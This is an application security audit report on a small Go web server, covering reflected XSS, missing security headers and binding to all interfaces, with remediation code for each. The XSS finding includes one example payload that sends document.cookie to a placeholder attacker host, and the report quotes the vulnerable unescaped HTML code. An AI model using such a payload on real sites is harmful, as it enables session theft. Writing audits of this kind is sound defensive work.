## Finding 1: Cross-Site Scripting (Reflected XSS)

**Finding ID:** `APPSEC-27bda94a1b94`
**File:** `main.go`
**Lines:** 22–24
**CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation
**OWASP Category:** A03:2021 – Injection
**Priority:** P1
**Severity:** HIGH
**Confidence:** HIGH

### Vulnerable Code
```go
name := r.URL.Query().Get("name")
response := fmt.Sprintf("<html><body><h1>Hello, %s!</h1></body></html>", name)
fmt.Fprint(w, response)
```

### Description
The `name` query parameter is read from user input and interpolated directly into an HTML response body via `fmt.Sprintf` with the `%s` verb, which performs no HTML encoding whatsoever. An attacker who crafts a URL such as `/greet?name=<script>fetch('https://attacker.example/c?k='+document.cookie)</script>` and tricks a victim into visiting it will execute arbitrary JavaScript in the victim's browser under the application's origin. This enables session token exfiltration, credential phishing, keylogging, or forced state-changing requests. Go's `html/template` package auto-escapes values at context-appropriate encoding points; `fmt.Sprintf` provides no such protection.

### Prioritization
This is the highest-priority finding in this codebase. The source-to-sink path is direct and requires no preconditions beyond a victim clicking a crafted link. No sanitization or encoding exists anywhere between `r.URL.Query().Get("name")` and the emitted response bytes.

### Exploitability Notes
- **Exploit Preconditions:** Attacker can deliver a crafted URL to a victim; victim's browser must render the response as `text/html` (Go's `net/http` will auto-detect the HTML content type and set the header correctly).
- **Uncertainty Boundary:** Impact depends on what sensitive context (auth cookies, tokens, sensitive API actions) is accessible from this origin. If the server is local-only/no cookies are used, practical impact is lower — but the vulnerability is confirmed regardless.
- **Counterfactual:** Using `html/template` with a typed `template.HTML`-safe template and passing `name` as a data variable (not as raw HTML) would make this finding invalid.

### Remediation
Replace `fmt.Sprintf` HTML construction with Go's `html/template` package, which performs context-aware auto-escaping:

```go
import (
    "html/template"
    "net/http"
)

var greetTmpl = template.Must(template.New("greet").Parse(
    `<html><body><h1>Hello, {{.}}!</h1></body></html>`,
))

http.HandleFunc("/greet", func(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    w.Header().Set("Content-Type", "text/html; charset=utf-8")
    greetTmpl.Execute(w, name)
})
```

`html/template` automatically encodes `<`, `>`, `"`, `'`, and `&` to their HTML entity equivalents in the correct context, so `<script>` becomes `&lt;script&gt;` in the rendered output.

- https://owasp.org/www-community/attacks/xss/
- https://cwe.mitre.org/data/definitions/79.html
- https://pkg.go.dev/html/template

## Finding 2: Missing HTTP Security Headers

**Finding ID:** `APPSEC-3fbc9902b10d`
**File:** `main.go`
**Lines:** 9–25
**CWE:** CWE-16 — Configuration
**OWASP Category:** A05:2021 – Security Misconfiguration
**Priority:** P2
**Severity:** LOW
**Confidence:** HIGH

### Vulnerable Code
```go
http.HandleFunc("/greet", func(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    response := fmt.Sprintf("<html><body><h1>Hello, %s!</h1></body></html>", name)
    fmt.Fprint(w, response)
})
```

### Description
No response handler sets defensive HTTP security headers. The following are absent from all responses: `Content-Security-Policy` (no restriction on script/resource sources), `X-Content-Type-Options: nosniff` (allows MIME-type sniffing), `X-Frame-Options: DENY` (allows clickjacking via iframe embedding), and `Strict-Transport-Security` (no HSTS). The absence of CSP is most significant here because it removes a defense-in-depth layer against the XSS in Finding 1 — a CSP that blocked inline scripts would limit exploit impact even without fixing the template bug.

### Prioritization
P2 after the XSS. On its own this is LOW severity since headers are defense-in-depth, not primary controls. However, the lack of CSP directly amplifies the P1 finding.

### Exploitability Notes
- **Exploit Preconditions:** An attacker must already exploit another vulnerability (e.g., the XSS) for header absence to increase harm; headers alone are not exploitable.
- **Uncertainty Boundary:** If the application is deployed behind a reverse proxy that injects these headers, risk is reduced — but that is not visible in-scope.

### Remediation
Add a middleware wrapper that sets security headers on every response:

```go
func secureHeaders(next http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Security-Policy", "default-src 'self'")
        w.Header().Set("X-Content-Type-Options", "nosniff")
        w.Header().Set("X-Frame-Options", "DENY")
        w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
        next(w, r)
    }
}

// Usage:
http.HandleFunc("/greet", secureHeaders(func(w http.ResponseWriter, r *http.Request) { ... }))
```

For HSTS, add `Strict-Transport-Security: max-age=63072000; includeSubDomains` only when TLS is enabled.

### References
- https://owasp.org/www-project-secure-headers/
- https://cwe.mitre.org/data/definitions/16.html

## Finding 3: Server Binds on All Interfaces Despite Advertised localhost

**Finding ID:** `APPSEC-cede2d56536a`
**File:** `main.go`
**Lines:** 27–28
**CWE:** CWE-668 — Exposure of Resource to Wrong Sphere
**OWASP Category:** A05:2021 – Security Misconfiguration
**Priority:** P3
**Severity:** INFO
**Confidence:** HIGH

### Vulnerable Code
```go
fmt.Println("Server is running at http://localhost:8080/")
http.ListenAndServe(":8080", nil)
```

### Description
The startup log message claims the server runs on `localhost:8080`, but `http.ListenAndServe(":8080", nil)` binds to `0.0.0.0:8080` — every available network interface. If this process runs on a host with external-facing interfaces (cloud VM, container with host networking), the application is reachable from the network without any indication to the operator. Combined with the XSS finding, unintended external exposure widens the potential victim population.

### Prioritization
P3 (INFO) — impact depends entirely on deployment context; not directly exploitable on its own.

### Exploitability Notes
- **Exploit Preconditions:** Host must have a reachable non-loopback interface; no firewall blocking port 8080.
- **Uncertainty Boundary:** Container/VM networking and firewall rules are outside scope.

### Remediation
If the intent is localhost-only, bind explicitly:

```go
fmt.Println("Server is running at http://localhost:8080/")
http.ListenAndServe("127.0.0.1:8080", nil)
```

Also check and handle the returned error:

```go
if err := http.ListenAndServe("127.0.0.1:8080", nil); err != nil {
    log.Fatalf("server failed: %v", err)
}
```

### References
- https://cwe.mitre.org/data/definitions/668.html
